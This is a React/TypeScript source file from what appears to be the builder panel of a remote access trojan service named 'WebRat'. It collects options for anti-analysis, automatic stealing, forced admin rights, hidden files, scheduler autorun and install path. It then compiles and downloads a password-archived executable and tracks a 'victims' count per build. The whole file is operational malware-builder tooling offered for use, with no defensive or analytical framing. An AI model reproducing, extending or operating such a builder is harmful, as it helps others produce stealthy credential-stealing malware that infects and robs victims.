import { useCallback, useRef } from "react";

import { resolveAccountLogin } from "../services/get-account-login";
import { compileGoFromConfig } from "../services/compile-go-config";
import { downloadBlob } from "../utils/download-blob";
import { getLastBuildTimestamp, setLastBuildTimestamp } from "../utils/last-build-ts";
import { openBuildModal } from "../utils/build-modal";
import { generateArchivePassword, generateBuildId } from "../utils/build-ids";
import { showToastSafe } from "../utils/toast";

type BuildHistoryItem = {
   id: string;
   name: string;
   version?: string;
   victims?: number;
   created?: string;
};

function getBuildsKey(login: string): string {
   const safe = String(login || "").trim();
   if (!safe) return "webrat_builds";
   return "webrat_builds_" + safe;
}

function loadBuildsHistory(login: string): BuildHistoryItem[] {
   const key = getBuildsKey(login);
   try {
      const raw = localStorage.getItem(key);
      if (!raw) return [];
      const parsed = JSON.parse(raw);
      if (!Array.isArray(parsed)) return [];
      return parsed as BuildHistoryItem[];
   } catch {
      return [];
   }
}

function saveBuildsHistory(login: string, items: BuildHistoryItem[]) {
   const key = getBuildsKey(login);
   try {
      localStorage.setItem(key, JSON.stringify(items));
   } catch {
   }
   try {
      window.dispatchEvent(new CustomEvent("webrat_builds_updated", { detail: { key } }));
   } catch {
   }
}

function setBuildingUi(building: boolean, progressText: string) {
   const createBtn = document.getElementById("createBtn") as HTMLButtonElement | null;
   const buildProgress = document.getElementById("buildProgress") as HTMLDivElement | null;
   const buildProgressText = document.getElementById("buildProgressText") as HTMLDivElement | null;

   const builderGrid = document.querySelector(".builderGrid") as HTMLDivElement | null;
   const builderFooter = document.querySelector(".builderFooter") as HTMLDivElement | null;
   const builderFormInner = document.querySelector(".builderFormInner") as HTMLDivElement | null;

   if (createBtn) createBtn.disabled = building;
   if (builderFormInner) builderFormInner.classList.toggle("isBuilding", building);
   if (builderGrid) builderGrid.hidden = building;
   if (builderFooter) builderFooter.hidden = building;

   if (buildProgress) buildProgress.hidden = !building;
   if (buildProgressText) buildProgressText.textContent = progressText;
}

function resetBuilderDefaults(setIconBase64: (v: string) => void, setDelay: (v: number) => void, setInstallMode: (v: string) => void) {
   try {
      const buildNameEl = document.getElementById("buildName") as HTMLInputElement | null;
      const buildCommentEl = document.getElementById("buildComment") as HTMLInputElement | null;
      const antiAnalysisEl = document.getElementById("antiAnalysis") as HTMLSelectElement | null;
      const autoStealEl = document.getElementById("autoSteal") as HTMLSelectElement | null;
      const forceAdminEl = document.getElementById("forceAdmin") as HTMLSelectElement | null;
      const installModeEl = document.getElementById("installMode") as HTMLSelectElement | null;
      const installPathEl = document.getElementById("installPath") as HTMLInputElement | null;
      const hideFilesEl = document.getElementById("hideFiles") as HTMLInputElement | null;
      const autorunEl = document.getElementById("autorun") as HTMLSelectElement | null;
      const extensionEl = document.getElementById("extension") as HTMLInputElement | null;
      const iconEl = document.getElementById("buildIcon") as HTMLInputElement | null;
      const iconNameEl = document.getElementById("buildIconName") as HTMLDivElement | null;

      if (buildNameEl) buildNameEl.value = "";
      if (buildCommentEl) buildCommentEl.value = "";

      const setSelect = (sel: HTMLSelectElement | null, v: string) => {
         if (!sel) return;
         sel.value = v;
         sel.dispatchEvent(new Event("change", { bubbles: true }));
      };

      setSelect(antiAnalysisEl, "None");
      setSelect(autoStealEl, "Once");
      setSelect(forceAdminEl, "Normal");
      setSelect(autorunEl, "scheduler");

      setInstallMode("random");
      setSelect(installModeEl, "random");
      if (installPathEl) installPathEl.value = "";

      if (hideFilesEl) hideFilesEl.checked = false;

      if (extensionEl) extensionEl.value = "webcrystal.exe";

      setIconBase64("");
      try {
         if (iconEl) iconEl.value = "";
      } catch {
      }
      if (iconNameEl) iconNameEl.textContent = "No icon selected";

      setDelay(2);
   } catch {
   }
}

function formatCreated(now: Date): string {
   const yyyy = String(now.getFullYear());
   const mm = String(now.getMonth() + 1).padStart(2, "0");
   const dd = String(now.getDate()).padStart(2, "0");
   const hh = String(now.getHours()).padStart(2, "0");
   const mi = String(now.getMinutes()).padStart(2, "0");
   const ss = String(now.getSeconds()).padStart(2, "0");
   return `${yyyy}-${mm}-${dd} ${hh}:${mi}:${ss}`;
}

export function useBuilderBuildFlow(opts: {
   iconBase64: string;
   setIconBase64: (v: string) => void;
   delay: number;
   setDelay: (v: number) => void;
   setInstallMode: (v: string) => void;
}) {
   const { iconBase64, setIconBase64, delay, setDelay, setInstallMode } = opts;

   const buildingRef = useRef(false);

   const startBuild = useCallback(async () => {
      if (buildingRef.current) return;

      const COOLDOWN_MS = 40 * 1000;
      const nowTs = Date.now();

      let login = "";
      try {
         login = String(localStorage.getItem("webrat_login") || "").trim();
      } catch {
         login = "";
      }

      const lastTs = getLastBuildTimestamp(login);
      if (lastTs && nowTs - lastTs < COOLDOWN_MS) {
         const remainingMs = COOLDOWN_MS - (nowTs - lastTs);
         const remainingSec = Math.max(1, Math.ceil(remainingMs / 1000));
         try {
            window.WebRatCommon?.showToast?.("warning", `Please waiting ${remainingSec} seconds`);
         } catch {
            showToastSafe("warning", `Please waiting ${remainingSec} seconds`);
         }
         return;
      }

      const buildNameEl = document.getElementById("buildName") as HTMLInputElement | null;
      const buildCommentEl = document.getElementById("buildComment") as HTMLInputElement | null;
      const forceAdminEl = document.getElementById("forceAdmin") as HTMLSelectElement | null;
      const installModeEl = document.getElementById("installMode") as HTMLSelectElement | null;
      const installPathEl = document.getElementById("installPath") as HTMLInputElement | null;

      const hideFilesEl = document.getElementById("hideFiles") as HTMLInputElement | null;
      const autorunEl = document.getElementById("autorun") as HTMLSelectElement | null;

      const rawName = String(buildNameEl?.value || "").trim();
      if (!rawName) {
         showToastSafe("warning", "Enter exe name!");
         return;
      }
      if (rawName.length > 25) {
         if (buildNameEl) buildNameEl.value = rawName.slice(0, 25);
         return;
      }
      if (!/^[A-Za-z0-9_-]+$/.test(rawName)) {
         showToastSafe("warning", "Use only English letters for exe name!");
         return;
      }

      const buildsHistory = loadBuildsHistory(login);
      if (buildsHistory.length >= 30) {
         showToastSafe("warning", "You cannot create more than 30 exe!");
         return;
      }
      const duplicate = buildsHistory.some((b) => String(b.name || "").trim() === rawName);
      if (duplicate) {
         showToastSafe("warning", "You cannot create same exe name!");
         return;
      }

      const buildName = rawName;
      const buildComment = String(buildCommentEl?.value || "").trim();
      const buildId = generateBuildId();

      const forceAdmin = String(forceAdminEl?.value || "Normal").trim() || "Normal";
      const hideFiles = !!hideFilesEl?.checked;

      const installMode = String(installModeEl?.value || "random");
      let installPath = "";
      if (installMode === "custom") {
         const rawPath = String(installPathEl?.value || "").trim();
         if (!rawPath) {
            showToastSafe("error", "Please fill in the install path field");
            return;
         }
         installPath = rawPath;
      }

      const autorunMode = String(autorunEl?.value || "scheduler");

      const antiAnalysisEl = document.getElementById("antiAnalysis") as HTMLSelectElement | null;
      const autoStealEl = document.getElementById("autoSteal") as HTMLSelectElement | null;
      const antiAnalysis = String(antiAnalysisEl?.value || "None");
      const autoSteal = String(autoStealEl?.value || "Once");

      const delaySec = (() => {
         const n = parseInt(String(delay || 0), 10);
         if (!Number.isFinite(n)) return 0;
         return Math.max(1, Math.min(10, n));
      })();
      void delaySec;
      void hideFiles;
      void autorunMode;
      void installPath;

      buildingRef.current = true;
      const password = generateArchivePassword();

      setBuildingUi(true, "Building");

      try {
         const resolved = await resolveAccountLogin();
         login = resolved;

         const { blob, filename } = await compileGoFromConfig({
            name: buildName,
            password,
            forceAdmin,
            iconBase64,
            buildId,
            comment: buildComment,
            autorunMode,
            startupDelaySeconds: delaySec,
            hideFilesEnabled: hideFiles,
            installMode,
            customInstallPath: installPath,
            antiAnalysis,
            autoSteal,
         });

         setBuildingUi(true, "Build complete!");

         downloadBlob(blob, filename);

         const created = formatCreated(new Date());
         const buildEntry: BuildHistoryItem = { name: buildName, id: buildId, version: "0.22.2", created, victims: 0 };

         const nextHistory = [buildEntry, ...loadBuildsHistory(login)];
         saveBuildsHistory(login, nextHistory);

         setLastBuildTimestamp(login, nowTs);

         resetBuilderDefaults(setIconBase64, setDelay, setInstallMode);

         setBuildingUi(false, "Building");
         openBuildModal(password);
      } catch (err) {
         setBuildingUi(false, "Building");

         const msg =
            err && typeof err === "object" && "message" in err
               ? String((err as { message?: unknown }).message)
               : String(err || "unknown error");
         alert("Build failed: " + msg);
      } finally {
         buildingRef.current = false;
      }
   }, [delay, iconBase64, setDelay, setIconBase64, setInstallMode]);

   return { startBuild };
}
